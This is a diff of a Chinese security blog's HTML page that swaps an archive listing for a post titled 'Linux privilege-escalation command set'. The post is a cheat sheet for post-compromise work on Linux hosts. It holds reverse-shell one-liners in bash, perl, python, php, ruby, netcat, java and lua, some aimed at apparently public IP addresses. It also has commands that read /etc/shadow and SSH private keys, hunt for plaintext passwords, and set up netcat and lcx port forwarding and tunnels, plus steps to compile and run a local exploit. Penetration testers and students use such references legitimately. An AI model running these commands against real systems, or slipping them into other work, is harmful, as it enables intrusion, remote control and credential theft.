@@ -86,16 +86,17 @@
 
 
 
-<meta name="description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:url" content="http://MaiKeFee.com/archives/2019/index.html">
+<meta name="description" content="0x00 操作系统相关操作系统类型版本 cat /etc/issue cat /etc/*-release cat /etc/lsb-release      # Debian  cat /etc/redhat-release   # Redhat内核版本，是否是64位 cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux 提权常用命令集">
+<meta property="og:url" content="http://MaiKeFee.com/archives/27fa4050.html">
 <meta property="og:site_name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
+<meta property="og:description" content="0x00 操作系统相关操作系统类型版本 cat /etc/issue cat /etc/*-release cat /etc/lsb-release      # Debian  cat /etc/redhat-release   # Redhat内核版本，是否是64位 cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-08-27T15:07:38.923Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta name="twitter:description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
+<meta name="twitter:title" content="Linux 提权常用命令集">
+<meta name="twitter:description" content="0x00 操作系统相关操作系统类型版本 cat /etc/issue cat /etc/*-release cat /etc/lsb-release      # Debian  cat /etc/redhat-release   # Redhat内核版本，是否是64位 cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep">
 
 
 
@@ -125,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/archives/2019/">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/27fa4050.html">
 
 
 
 
 
-  <title>归档 | MaiKeFee|一个兴趣使然的信息安全爱好者</title>
+  <title>Linux 提权常用命令集 | MaiKeFee|一个兴趣使然的信息安全爱好者</title>
   
 
 
@@ -150,7 +151,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -296,391 +297,455 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/27fa4050.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="MaiKeFee">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/MaiKeFee_Logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">Linux 提权常用命令集</h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-27T23:07:32+08:00">
+                2019-08-27
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-27T23:07:38+08:00">
+                2019-08-27
+              </time>
+            
+          </span>
+
           
-        
-        嗯..! 目前共计 23 篇日志。 继续努力。
-      </span>
 
-      
-
-        
-        
-        
-
-        
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
+            
+          
 
-        
+          
+          
+             <span id="/archives/27fa4050.html" class="leancloud_visitors" data-flag-title="Linux 提权常用命令集">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/2ea7b633.html" itemprop="url">
+          
+            <div class="post-wordcount">
               
-                <span itemprop="name">「disablefunc绕过」一种绕过php disablefunc的方法复现</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.9k
+                </span>
               
-            </a>
-        
-      </h2>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:14:27+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
+              
+                <span class="post-meta-divider">|</span>
+              
 
-    </header>
-  </article>
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
 
+          
 
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/c0cf419.html" itemprop="url">
-              
-                <span itemprop="name">SSRF中的绕过姿势</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:14:09+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/a90cd968.html" itemprop="url">
-              
-                <span itemprop="name">不知道列名的情况下注入</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:13:43+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
+        <p>0x00 操作系统相关<br>操作系统类型版本</p>
+<pre><code>cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release      # Debian 
+cat /etc/redhat-release   # Redhat</code></pre><p>内核版本，是否是64位</p>
+<pre><code>cat /proc/version
+uname -a
+uname -mrs
+rpm -q kernel
+dmesg | grep Linux
+ls /boot | grep vmlinuz-</code></pre><p>环境变量</p>
+<pre><code>cat /etc/profile
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+env
+set</code></pre><p>查看是否有打印机</p>
+<pre><code>lpstat -a</code></pre><p>0x01 应用与服务相关<br>查看正在运行的程序及对应的用户权限</p>
+<pre><code>ps aux
+ps -ef
+top
+cat /etc/services</code></pre><p>以root权限运行的进程</p>
+<pre><code>ps aux | grep root
+ps -ef | grep root</code></pre><p>查看安装了的应用</p>
+<pre><code>ls -alh /usr/bin/
+ls -alh /sbin/
+dpkg -l
+rpm -qa
+ls -alh /var/cache/apt/archives
+ls -alh /var/cache/yum/</code></pre><p>一些服务的配置文件</p>
+<pre><code>cat /etc/syslog.conf
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf
+cat /etc/inetd.conf
+cat /etc/apache2/apache2.conf
+cat /etc/my.conf
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos;</code></pre><p>计划任务</p>
+<pre><code>crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root</code></pre><p>找存储的明文用户名，密码</p>
+<pre><code>grep -i user [filename]
+grep -i pass [filename]
+grep -C 5 &quot;password&quot; [filename]
+find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</code></pre><p>0x02 通信与网络相关<br>查看当前网络地址</p>
+<pre><code>/sbin/ifconfig -a
+cat /etc/network/interfaces
+cat /etc/sysconfig/network</code></pre><p>查看网络配置,DNS,DHCP,网关</p>
+<pre><code>cat /etc/resolv.conf
+cat /etc/sysconfig/network
+cat /etc/networks
+iptables -L
+hostname
+dnsdomainname</code></pre><p>查看网络通信</p>
+<pre><code>lsof -i
+lsof -i :80
+grep 80 /etc/services
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep 3:on
+last
+w</code></pre><p>查看缓存</p>
+<pre><code>arp -e
+route
+/sbin/route -nee
+tcpdump
 
-        
-        
-        
+tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
+tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]</code></pre><p>交互式shell<br>bash版本：</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><p>perl版本:</p>
+<pre><code>perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><p>python版本:</p>
+<pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><p>php版本：</p>
+<pre><code>php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre><p>ruby版本：</p>
+<pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><p>nc版本：</p>
+<pre><code>nc -e /bin/sh 223.8.200.234 1234</code></pre><p>nc不使用-e：</p>
+<pre><code>mknod /tmp/backpipe p
+/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</code></pre><p>mknod:</p>
+<pre><code>mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</code></pre><p>java版本：</p>
+<pre><code>r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/202.103.243.122/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()</code></pre><p>lua版本：</p>
+<pre><code>lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;202.103.243.122&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</code></pre><p>端口转发</p>
+<pre><code>lcx
 
-        
-        
+lcx -listen 4567 33891 #Attacker
+lcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets
+ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
 
-        
+ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
+ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe    
+mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe    # Proxy (Port 80 to 8080)
+mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe    # Proxy monitor (Port 80 to 8080)</code></pre><p>隧道</p>
+<pre><code>ssh -D 127.0.0.1:9050 -N [username]@[ip]
+proxychains ifconfig</code></pre><p>0x03 用户相关<br>用户信息</p>
+<pre><code>id
+who
+w
+last
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+ls -alh /var/mail/
+grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 { print $1}&apos;   # 列出超级用户
+awk -F: &apos;($3 == &quot;0&quot;) {print}&apos; /etc/passwd   #列出超级用户
+cat /etc/sudoers
+sudo -l</code></pre><p>列家目录</p>
+<pre><code>ls -ahlR /root/
+ls -ahlR /home/</code></pre><p>从配置文件里面寻找密码</p>
+<pre><code>cat /var/apache2/config.inc
+cat /var/lib/mysql/mysql/user.MYD
+cat /root/anaconda-ks.cfg</code></pre><p>看其他用户的操作记录</p>
+<pre><code>cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history
+cat ~/.php_history</code></pre><p>ssh私钥</p>
+<pre><code>cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key</code></pre><p>0x04 文件系统相关<br>/etc/目录下面文件</p>
+<pre><code>ls -aRl /etc/ | awk &apos;$1 ~ /^.*w.*/&apos; 2&gt;/dev/null     # Anyone
+ls -aRl /etc/ | awk &apos;$1 ~ /^..w/&apos; 2&gt;/dev/null       # Owner
+ls -aRl /etc/ | awk &apos;$1 ~ /^.....w/&apos; 2&gt;/dev/null    # Group
+ls -aRl /etc/ | awk &apos;$1 ~ /w.$/&apos; 2&gt;/dev/null        # Other
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/21b719d6.html" itemprop="url">
-              
-                <span itemprop="name">渗透过程中的SSH(后门建立)</span>
-              
-            </a>
-        
-      </h2>
+find /etc/ -readable -type f 2&gt;/dev/null               # Anyone
+find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null   # Anyone</code></pre><p>日志文件</p>
+<pre><code>ls -alh /var/log
+ls -alh /var/mail
+ls -alh /var/spool
+ls -alh /var/spool/lpd
+ls -alh /var/lib/pgsql
+ls -alh /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases</code></pre><p>查看网站文件</p>
+<pre><code>ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/
+ls -alhR /var/www/html/</code></pre><p>常见日志文件</p>
+<pre><code>cat /etc/httpd/logs/access_log
+cat /etc/httpd/logs/access.log
+cat /etc/httpd/logs/error_log
+cat /etc/httpd/logs/error.log
+cat /var/log/apache2/access_log
+cat /var/log/apache2/access.log
+cat /var/log/apache2/error_log
+cat /var/log/apache2/error.log
+cat /var/log/apache/access_log
+cat /var/log/apache/access.log
+cat /var/log/auth.log
+cat /var/log/chttp.log
+cat /var/log/cups/error_log
+cat /var/log/dpkg.log
+cat /var/log/faillog
+cat /var/log/httpd/access_log
+cat /var/log/httpd/access.log
+cat /var/log/httpd/error_log
+cat /var/log/httpd/error.log
+cat /var/log/lastlog
+cat /var/log/lighttpd/access.log
+cat /var/log/lighttpd/error.log
+cat /var/log/lighttpd/lighttpd.access.log
+cat /var/log/lighttpd/lighttpd.error.log
+cat /var/log/messages
+cat /var/log/secure
+cat /var/log/syslog
+cat /var/log/wtmp
+cat /var/log/xferlog
+cat /var/log/yum.log
+cat /var/run/utmp
+cat /var/webmin/miniserv.log
+cat /var/www/logs/access_log
+cat /var/www/logs/access.log
+ls -alh /var/lib/dhcp3/
+ls -alh /var/log/postgresql/
+ls -alh /var/log/proftpd/
+ls -alh /var/log/samba/</code></pre><p>文件挂载</p>
+<pre><code>mount
+df -h
+cat /etc/fstab</code></pre><p>Find命令</p>
+<pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # 只有目录所有者才可以更改删除
+find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:13:07+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
+find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
+for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # 从下面几个位置: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者其他的bin目录寻找 
 
-    </header>
-  </article>
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null #从/，SGUD或者SUID开始查找，排除符号链接，深度为3个文件夹，显示详细的清单并去除错误信息
+寻找可写目录
 
+find / -writable -type d 2&gt;/dev/null      # 可写目录
+find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 
+find / -perm -o w -type d 2&gt;/dev/null     # 可写目录
 
+find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录
 
+find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # 可写可执行</code></pre><p>目录<br>查找文件</p>
+<pre><code>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print  2&gt;/dev/null # 可写文件
+find / dir -xdev \( -nouser -o -nogroup \) -print  2&gt;/dev/null # 无所有者文件</code></pre><p>0x05 准备及攻击<br>查看语言支持</p>
+<pre><code>find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -name cc</code></pre><p>查看上传方式</p>
+<pre><code>find / -name wget
+find / -name nc*
+find / -name netcat*
+find / -name tftp*
+find / -name ftp</code></pre><p>寻找exp</p>
+<pre><code>http://www.exploit-db.com
+http://1337day.com
+http://www.securiteam.com
+http://www.securityfocus.com
+http://www.exploitsearch.net
+http://metasploit.com/modules/
+http://securityreason.com
+http://seclists.org/fulldisclosure/
+http://www.google.com</code></pre><p>编译exp</p>
+<pre><code>which gcc
+gcc exp.c -o exp</code></pre><p>运行</p>
+<pre><code>chmod +x exp
+./exp</code></pre><p>0x06 提权辅助脚本</p>
+<pre><code>LinEnum
+
+linuxprivchecker.py</code></pre>
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/bd98337b.html" itemprop="url">
-              
-                <span itemprop="name">域渗透中找DC</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:12:25+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/ed9d09ca.html" itemprop="url">
-              
-                <span itemprop="name">使用Invoke-Mimikatz.ps1批量获取windows密码</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:11:58+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/54ea983c.html" itemprop="url">
-              
-                <span itemprop="name">「木马变形」一句话木马的各种变形</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:11:15+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/7eaedcae.html" itemprop="url">
-              
-                <span itemprop="name">Commands 搜集(持续更新)</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:10:48+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/df6dc829.html" itemprop="url">
-              
-                <span itemprop="name">「应急响应」应急响应实战笔记,一个安全工程师的自我修养</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:10:02+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/2db90a41.html" itemprop="url">
-              
-                <span itemprop="name">「前端钓鱼欺骗」前端黑魔法之远程控制地址栏</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:09:37+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/e83f08e9.html" rel="next" title="Mimikatz 使用Tips">
+                <i class="fa fa-chevron-left"></i> Mimikatz 使用Tips
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/archives/e9bb571b.html" rel="prev" title="最短php一句话">
+                最短php一句话 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/2019/page/2/">2</a><a class="page-number" href="/archives/2019/page/3/">3</a><a class="extend next" rel="next" href="/archives/2019/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -688,6 +753,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -934,6 +1006,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
